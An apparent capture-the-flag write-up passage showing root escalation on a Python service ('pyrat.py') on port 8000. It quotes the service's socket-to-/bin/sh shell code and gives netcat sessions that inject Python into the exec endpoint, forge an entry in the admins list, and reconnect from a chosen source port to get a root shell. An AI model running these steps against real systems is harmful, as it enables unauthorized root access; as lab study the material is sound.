the code was:

```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
```

this `uid = os.getuid()` seems dubious because if it would always lead to `root` if the script is being run as `root` the server might be doing something else in the actual running script

```python
$ nc 10.48.148.113 8000
print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7eff578204c0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/root/pyrat.py', '__cached__': None, 'socket': <module 'socket' from '/usr/lib/python3.8/socket.py'>, 'sys': <module 'sys' (built-in)>, 'StringIO': <class '_io.StringIO'>, 'datetime': <module 'datetime' from '/usr/lib/python3.8/datetime.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'multiprocessing': <module 'multiprocessing' from '/usr/lib/python3.8/multiprocessing/__init__.py'>, 'manager': <multiprocessing.managers.SyncManager object at 0x7eff57780640>, 'admins': <ListProxy object, typeid 'list' at 0x7eff576f49a0>, 'handle_client': <function handle_client at 0x7eff570cb8b0>, 'switch_case': <function switch_case at 0x7eff570cbe50>, 'exec_python': <function exec_python at 0x7eff570cbee0>, 'get_admin': <function get_admin at 0x7eff570cbf70>, 'shell': <function shell at 0x7eff570d2040>, 'send_data': <function send_data at 0x7eff570d20d0>, 'start_server': <function start_server at 0x7eff570d2160>, 'remove_socket': <function remove_socket at 0x7eff570d21f0>, 'is_http': <function is_http at 0x7eff570d2280>, 'fake_http': <function fake_http at 0x7eff570d2310>, 'change_uid': <function change_uid at 0x7eff570d23a0>, 'host': '0.0.0.0', 'port': 8000, '__warningregistry__': {'version': 0}}

import inspect; inspect.getsource(handle_client);  
could not get source code
import inspect; inspect.getsource(get_admin);        
could not get source code
```

looks like we can't get source code of functions let's check some global vars instead

```console
var_names = [k for k, v in globals().items() if not k.startswith('__') and not callable(v)]; print(var_names)
['socket', 'sys', 'datetime', 'os', 'multiprocessing', 'manager', 'admins', 'host', 'port']

print(type(admins))
<class 'multiprocessing.managers.ListProxy'>

print(admins)
[]

print(locals())
{'client_socket': <socket.socket fd=7, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.48.161.164', 8000), raddr=('192.168.247.244', 51892)>, 'data': 'print(locals())', 'captured_output': <_io.StringIO object at 0x7fa838419430>}
```

interesting admins is just an empty list. theory:

```python
admins = []  # global list

def switch_case(client_socket, data):
    if str(client_socket) not in admins:
        change_uid()  # drop from root to normal user
    
    if data == 'shell':
        shell(client_socket)
```

let's confirm it:

```
$ nc 10.49.164.56 8000 -v
Connection to 10.49.164.56 8000 port [tcp/*] succeeded!
admins.append(str(client_socket));

print(admins);
["<socket.socket fd=7, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.49.164.56', 8000), raddr=('192.168.247.244', 50072)>"]

^C
```

then make sure to connect with the same port quickly

```
$ sudo ncat 10.49.164.56 8000 --source-port 50072
shell
# whoami
root
```

Note: the file descriptor our os would assign to the socket opened by ncat could change than what we appended to admins list in nc session and you will get normal shell in that case so it's better to first get the value of `socket_client` string then copy and loop through to append like `1-100` fds so it would match eitherway.

i.e.

```python
[admins.append("<socket.socket fd=" + str(i) + ", family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.49.164.56', 8000), raddr=('192.168.247.244', 50072)>") for i in range(3, 100)]
```
